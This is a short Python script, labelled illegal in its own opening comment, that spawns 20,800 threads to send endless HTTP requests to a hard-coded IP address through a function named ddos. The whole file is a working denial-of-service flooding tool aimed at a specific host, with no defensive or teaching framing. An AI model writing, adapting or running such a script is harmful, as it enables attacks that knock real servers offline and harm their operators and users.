# This program is illegal...
import requests
from time import sleep
import threading

i = 0
url = "http://209.97.178.154"
show = 1
time = 0
thread_count = 20800

def ddos():
  global i
  while True:
    r = requests.get(url)
    if r.status_code == 200:
      i += 1
      if i % show == 0:
        print(i)
    sleep(time)

threads = []

for a in range(thread_count):
  threads.append(threading.Thread(target=ddos))
  threads[a].start()

while True:
  pass